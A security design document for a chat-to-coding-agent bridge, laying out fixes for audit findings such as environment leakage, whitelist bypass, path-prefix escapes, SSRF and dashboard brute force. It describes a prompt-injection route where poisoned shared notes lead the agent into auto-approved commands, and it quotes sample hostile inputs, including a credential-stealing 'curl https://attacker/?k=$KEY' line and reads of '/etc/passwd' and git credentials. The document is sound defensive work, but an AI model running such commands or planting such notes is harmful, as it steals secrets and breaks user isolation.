## Context

AIr-Friends is a self-hosted Deno/TypeScript daemon that bridges Discord/Misskey chat to an external ACP agent subprocess. Its defining trust boundary is that **untrusted chat content becomes agent input**, and the agent can request shell/file operations that are approved automatically by an ACP permission whitelist (restricted mode) rather than a human. A security audit (run-1) confirmed 8 MEDIUM+ findings (F1–F8) plus 3 LOW (F9–F11). This change implements fixes for the exploitable findings.

Two audit findings (F2's severity, and parts of the permission model) were rated relative to a three-agent surface (Copilot `--deny-tool`, Gemini policy engine, OpenCode declarative permissions). The project is pre-release with **zero production users**, so we are simultaneously narrowing to **OpenCode as the single supported ACP agent**. The actual removal of Copilot/Gemini is a separate future change; here we (a) fix the shared enforcement layer that protects OpenCode and (b) explicitly defer the Copilot/Gemini-specific mitigations.

Relevant current state verified in code:
- `src/acp/agent-connector.ts:91` spawns via `Deno.Command` with `env: agentConfig.env` and **no** `clearEnv` → parent env merges in (F1).
- `src/acp/client.ts:126-130` `matchesScriptPath` uses `tokens.some(...)`; `containsShellOperators` allows spaces and `$` (F2).
- `src/acp/client.ts:770-821` three boundary checks use `startsWith` without a trailing separator; `readTextFile` (`:669`) has no extension check (F4).
- `ClientConfig` (`src/acp/types.ts:8-35`) has no `canWriteAgentWorkspace`; the write-approval branch gates on path+extension only (F3).
- `agent-config/opencode.json:82-83` allows `curl *` / `wget *` in restricted mode (F3 egress).
- Dashboard rate-limit keys on `X-Forwarded-For`; binds `0.0.0.0`; `Secure` cookie gated on `X-Forwarded-Proto` (F5, F8, F10).
- `session-orchestrator.ts:~2597` `fetch(att.url)` with no URL validation (F6).
- `reply-handler.ts` `handleEditReply` uses `params.messageId` unscoped (F7).
- `misskey-adapter.ts:105-107` hardcodes `isDm=false` for mention notes (F11).

## Goals / Non-Goals

**Goals:**

- Make the advertised agent env isolation actually hold at runtime (F1).
- Close the command-whitelist bypass so a whitelisted script path cannot launder an arbitrary command (F2, OpenCode-scoped).
- Prevent ordinary user sessions from writing to the shared agent workspace and remove the auto-approved egress that turns a poisoned note into exfiltration (F3).
- Make all ACP-client path boundary checks reject sibling-prefix escapes and extension-check reads (F4).
- Harden the dashboard's login rate limiting, bind host, cookie flag, and passphrase strength (F5, F8, F10).
- Prevent SSRF via unvalidated Misskey attachment URLs (F6).
- Scope `edit-reply` to the session's own last message (F7).
- Classify Misskey `specified` notes as DMs for correct reply gating (F11).

**Non-Goals:**

- Removing Copilot/Gemini agents and their `--deny-tool` / policy-engine layers (separate future change).
- Fixing F9 (reply-cap TOCTOU, LOW) — documented as accepted-for-now.
- Backward compatibility / migration of existing config files — pre-release, zero users, so config fields may be added without a migration shim.
- Redesigning the permission model into a fully sandboxed executor (out of scope; we harden the existing whitelist).
- Removing the dashboard's dormant multi-agent selection (`handleChatConnect` still accepts `copilot`/`gemini`, and `getDefaultAgentType` still falls back to `copilot`). Because agent removal is a separate change, this proposal's closure claims are **explicitly OpenCode-scoped**: an operator who selects Copilot/Gemini in the dashboard can still reach code paths whose agent-specific mitigations are deferred. This scoping caveat is called out here rather than silently overstating full closure (see Risk below).

## Decisions

### D1 — F1: `clearEnv: true` on the agent spawn

Set `clearEnv: true` on the `Deno.Command` in `agent-connector.ts` and continue passing the already-fully-built `agentConfig.env` (which `agent-factory.ts` populates with `PATH`, `HOME`, `TMPDIR`, `DENO_DIR`, `SESSION_ID`, `AGENT_WORKSPACE`, agent-specific keys, etc.).

- **Why:** `Deno.Command` merges `env` with the parent unless `clearEnv` is set; the audit confirmed this via a live test. The `SandboxManager.buildFilteredEnv` allowlist is meaningless without it.
- **Alternative considered:** scrub secrets from the parent process env at bootstrap — rejected: the parent legitimately needs those secrets (bot tokens, provider keys, git creds), and it is fragile.
- **Verification:** a spawn-level test injects a fake parent secret (`Deno.env.set`) and asserts it is absent from the child's real environment (e.g. child runs `printenv` / reads `/proc/self/environ`), not just from the builder's returned dict.

### D2 — F2: entrypoint-anchored command matching

Replace the `tokens.some(...)` logic in `matchesScriptPath` with a structural match against the known skill invocation form. Skills are invoked as `deno run <flags...> <script-path> <args...>`. The matcher SHALL require:

1. the first token to be an allowed interpreter (`deno`), and
2. the whitelisted script path to appear as the **entrypoint positional** (the first non-flag token after `run`), not as any trailing argument.

For `matchesCommandPrefix`, keep first-token exact-match but additionally reject when subsequent tokens contain path-like arguments outside the workspace (so `cat /home/deno/.git-credentials <script>` cannot pass on OpenCode either — though note D3 also removes the broad `cat`/`curl` egress). The out-of-workspace check strips surrounding quotes and `--flag=` prefixes before inspecting a token, so `agent-browser "/etc/passwd"` and `agent-browser --file=/etc/passwd` are also rejected. (Whitespace tokenization is not full shell parsing; this is a defense-in-depth tightening, not a complete shell-safety guarantee — command-prefix skills should remain minimal.)

- **Why:** the audit's exploit relies on a whitelisted script path being accepted as *any* token while an arbitrary binary occupies the first token. Anchoring to the entrypoint eliminates the laundering.
- **Trade-off:** tighter matching could reject legitimate but unusual invocations; mitigated by keeping the interpreter+entrypoint contract identical to how the orchestrator actually spawns skills (verified against `agent-factory.ts` / skill invocation).
- **Scope note:** on the surviving OpenCode agent, the declarative `opencode.json` bash globs already reject a `tar …` prefix; this ACP-gate fix removes reliance on that single layer. Copilot/Gemini-specific blast radius is moot post-removal.

### D3 — F3: `canWriteAgentWorkspace` gating + remove blanket egress

Two-part fix:

1. **Write-gating:** add `canWriteAgentWorkspace?: boolean` to `ClientConfig`. The flag already exists as a `TemplateVariables` field and is set `true` for self-research only (`session-orchestrator.ts:2782`); it is currently *unenforced* at the permission layer. The orchestrator SHALL set it `true` **only for self-research** sessions (the only flow that legitimately authors shared notes — verified: memory-maintenance operates on per-user memory JSONL via memory skills, `session-orchestrator.ts:1483`, and does NOT write the shared workspace) and `false`/absent for ordinary user, spontaneous, channel-lurk, and memory-maintenance sessions. `requestPermission`'s edit/write branch and `writeTextFile` SHALL reject agent-workspace writes when the flag is not set, even if path+extension pass. TMPDIR writes remain allowed (per-session scratch). Enforce at **both** duplicated sinks: `requestPermission` (`client.ts:427-495`) and `writeTextFile` (`client.ts:698-743`).
2. **Egress removal:** remove `curl *` and `wget *` from `agent-config/opencode.json` restricted-mode `bash` allows. Agents that need web content use the dedicated `agent-browser`/fetch skills, or run under YOLO/network-isolation for research. This closes the "poisoned note → `curl https://attacker/?k=$KEY`" leg.

- **Why:** the shared workspace is a cross-user injection store; the audit showed writes were ungated and egress was auto-approved. Both legs must be cut.
- **Alternative:** per-user agent workspaces — rejected: the shared knowledge base is an intentional product feature (Feature 15); the correct fix is write-gating + treating re-injected note content as untrusted data, not partitioning.
- **Defense-in-depth note:** even with D1 removing provider keys from the child env, removing egress prevents SSRF-style internal exfiltration; keep both.

### D4 — F4: boundary-safe path comparison + read extension check

Introduce a single helper `isWithinDir(path, base)` that returns `resolved === resolvedBase || resolved.startsWith(resolvedBase + SEP)`, and use it in `isPathAllowed`, `isAgentWorkspacePath`, and `isWithinTmpDir`. Prefer reusing the `relative()`-based `validatePathWithinBoundary` already proven in `workspace-manager.ts`.

For the `readTextFile` extension check, do **not** blindly reuse `hasAllowedWriteExtension` (the write allowlist is `.md`/`.txt`, which would break legitimate agent reads of `memory.public.jsonl` and other workspace state). Instead define an explicit **read** allowlist by purpose: the agent legitimately reads workspace memory JSONL (`.jsonl`), markdown notes/prompts (`.md`), and plain text (`.txt`). Deny everything else (e.g. arbitrary `.json` cache/token files). The read set is broader than the write set by design; it must still exclude any sensitive-but-text file types that could appear inside allowed directories. Tests SHALL prove both directions: operational reads (memory JSONL) still work, and a disallowed extension is denied.

- **Why:** `startsWith` without a trailing separator lets `/…/123` match `/…/1234`; Discord snowflakes are variable-length, so prefix collisions are realistic → cross-user `memory.private.jsonl` read.
- **Trade-off:** none material; the trailing-separator form is the standard correct idiom.

### D5 — F5/F8/F10: dashboard hardening

- **F5 rate-limit key:** default to `info.remoteAddr.hostname` (real connection IP). Only honor `X-Forwarded-For` when the connection's real IP is in a configured `dashboard.trustedProxies` allow-list. The trusted-proxy comparison SHALL normalize both the real socket address and the configured entries to a canonical host string (strip port; normalize IPv4/IPv6 forms) and match exactly; no header parsing occurs unless the peer matches after normalization. Add a global sliding-window failed-attempt counter with exponential backoff independent of per-IP keying, so header rotation cannot grant unlimited global attempts. Enforce a minimum passphrase length/entropy at config load (`config-loader.ts`), failing startup if the dashboard is enabled with a weak passphrase.
- **F8 host bind:** add `dashboard.host` (default `127.0.0.1`); pass `{ hostname }` to `Deno.serve`. Binding `0.0.0.0` requires explicit config.
- **F10 secure cookie:** add `dashboard.behindHttpsProxy` (bool); set the `Secure` cookie flag from that config flag (or a genuine TLS connection), never from the spoofable `X-Forwarded-Proto` header alone.

- **Why:** these three compound into "brute-forceable control plane exposed on all interfaces." Keying on the real socket address and defaulting to localhost neutralizes the main attack; config-driven flags remove reliance on attacker-controlled headers.
- **Alternative for F5:** CAPTCHA / account lockout — rejected as overkill for a single-passphrase self-hosted panel; real-IP keying + global backoff + strong passphrase suffices.

### D6 — F6: SSRF validation before attachment fetch

Add a `validateFetchUrl(url)` guard. The **authoritative** enforcement point is the fetch sink itself — the image downloader in `session-orchestrator.ts` SHALL call `validateFetchUrl` immediately before **every** network request, regardless of which platform or code path populated `Attachment.url`. Misskey ingestion-time validation in `misskey-utils.ts` is optional defense-in-depth only and must NOT be relied on as the sole guard (a future adapter/test helper could populate `Attachment.url` and still reach the sink). Validation:

1. scheme ∈ {http, https};
2. resolve DNS (all A/AAAA records) and reject loopback / private (RFC1918) / link-local (169.254/fe80) / ULA (fc00::/7) / unspecified / multicast;
3. `fetch(..., { redirect: "manual" })` and re-validate each redirect hop's `Location` before following, with an explicit maximum of **5** redirect hops before aborting.

- **Why:** federated Misskey DriveFile URLs can be attacker-controlled and are fetched server-side, enabling requests to `169.254.169.254` / `127.0.0.1:3001` with response exfiltration through the agent's image description.
- **Trade-off:** DNS-rebinding TOCTOU between resolution and connect is a known hard problem; we mitigate with manual-redirect re-validation and a documented residual risk. Full mitigation (pinning the resolved IP into the connection) is not available in Deno `fetch` today → Open Question.

### D7 — F7: scope `edit-reply` to the session's last-sent message

In `handleEditReply`, reject with a `SkillError` when `params.messageId !== context.lastSentMessageId`. This makes the Misskey delete-and-recreate path unable to target arbitrary bot notes from other conversations. Discord is already scoped by `context.channelId`, so this is a strict tightening.

Successive in-session edits keep working because the Skill API already replaces the tracked `lastSentMessageId` with the platform-returned new ID after a successful `edit-reply` (`skill-api/server.ts:419-424`) — important for Misskey, where delete-and-recreate yields a new note ID. The spec and tests SHALL cover **two consecutive Misskey edits in one session** to lock this invariant.

- **Why:** the only prior guard was "some reply was sent this session," not identity of the target message.
- **Trade-off:** an agent can now only edit its most recent reply; acceptable and matches the documented single-thread editing behavior.

### D8 — F11: derive `isDm` from Misskey note visibility

Change the mention handler to call `handleNote(note, isDirectMessage(note))` where `isDirectMessage` returns `true` for `specified`-visibility notes. Reply policy then gates these as DMs.

- **Why:** hardcoding `isDm=false` let `specified` private notes bypass the "DMs only if whitelisted" guarantee in `public` mode.
- **Trade-off:** none; this aligns classification with actual visibility. Confirm downstream reply visibility still stays `specified`.

## Risks / Trade-offs

- **[D1 breaks agents that relied on an inherited var]** → the audit and `agent-factory.ts` show the full required env is already built explicitly; any missing var surfaces immediately in the new spawn-level test and integration run. Add any discovered-missing var to the allowlist rather than reverting `clearEnv`. **Found & fixed during review:** `agent-config/opencode.json` references `{env:PIONEER_API_KEY}` for the Pioneer provider, which was previously reaching the agent only via accidental parent inheritance. With `clearEnv: true` it must be forwarded explicitly — added to both `agent-factory.ts` (opencode env build) and `sandbox-manager.ts` (`AGENT_TYPE_ENV.opencode` allowlist), with a regression test.
- **[D2 over-tightens and rejects a legitimate skill invocation]** → derive the exact interpreter+flag+entrypoint contract from the real orchestrator spawn code and cover it with tests before landing; keep the change OpenCode-scoped.
- **[D3 removes `curl`/`wget` that some workflow depended on]** → self-research/browse flows should use `agent-browser` or run with network isolation/YOLO; document the replacement. Pre-release, no user workflows depend on it.
- **[D5 real-IP keying misbehaves behind a legitimate proxy]** → the `trustedProxies` allow-list restores XFF handling for real deployments; default-deny is the safe posture.
- **[D6 DNS rebinding residual]** → documented Open Question; manual-redirect re-validation covers the redirect vector, and most instances proxy remote media anyway (precondition already narrow).
- **[Scope creep with agent removal]** → this change deliberately does **not** remove Copilot/Gemini; it only fixes the shared/OpenCode enforcement layer and marks the rest deferred, keeping the diff reviewable.
- **[Dashboard still exposes Copilot/Gemini selection]** → closure claims are OpenCode-scoped; until the agent-removal change lands, treat non-OpenCode dashboard agent selection as unsupported/insecure. Optionally (low-cost) constrain `handleChatConnect` to reject non-OpenCode agent types now — decided in Open Questions.
- **[Skill-directory approval path inconsistency]** → restricted-mode skill-directory read approval references `/home/deno/.copilot/skills` (`client.ts:318-345`) while OpenCode discovery uses `~/.agents/skills` and repo `skills/`. Verify the OpenCode-effective path and align (or document why unrelated) so tightening F2/F3 does not break skill discovery or leave an obsolete path approved. Add an OpenCode skill-discovery/read-approval test using the actual configured path.

## Migration Plan

No data migration (pre-release, zero users). Deployment steps:

1. Land code + spec deltas; run `deno fmt`, `deno lint`, `deno check`, `deno test` (coverage ≥ 75%).
2. Add new config fields to `config.example.yaml`, `.env.example`, `helm/values.yaml`, and document in `AGENTS.md`. New dashboard fields default to the secure posture (`host: 127.0.0.1`, `behindHttpsProxy: false`), so existing minimal configs keep working.
3. If the dashboard was previously reachable on `0.0.0.0`, operators must set `dashboard.host` explicitly and configure `trustedProxies` — call this out in the changelog.
4. Rollback: revert the change; no persistent state is altered.

## Open Questions

- **F6 DNS rebinding:** Deno `fetch` does not expose connect-time IP pinning. Acceptable to ship resolve-time validation + manual-redirect re-validation as the mitigation, with the rebinding gap documented? (Recommended: yes, given the narrow federation preconditions.)
- **D2 command contract:** should `matchesCommandPrefix` prefix-skills (if any remain after Copilot/Gemini removal) be dropped entirely in favor of interpreter+entrypoint-only matching, simplifying the matcher? To confirm against the final OpenCode-only skill invocation set. (Recommended: drop it if no OpenCode skill is command-prefix based.)
- **Dashboard multi-agent selection:** constrain `handleChatConnect`/`getDefaultAgentType` to OpenCode now, or accept an OpenCode-scoped closure caveat until the agent-removal change lands? **Decision (implemented):** NOT constrained in this change. The dashboard still accepts `copilot`/`gemini` and `getDefaultAgentType` still falls back to `copilot`; touching that surface belongs to the deferred agent-removal change (Non-Goals). This change's closure claims are therefore **explicitly OpenCode-scoped**: selecting a non-OpenCode agent in the dashboard can still reach code paths whose agent-specific mitigations are deferred. Operators must treat non-OpenCode dashboard agent selection as unsupported/insecure until agent removal lands.
- **F5 passphrase strength:** exact minimum (length vs. zxcvbn-style entropy)? Proposed: minimum length (e.g. ≥ 16 chars) enforced at load, keeping the dependency footprint small.
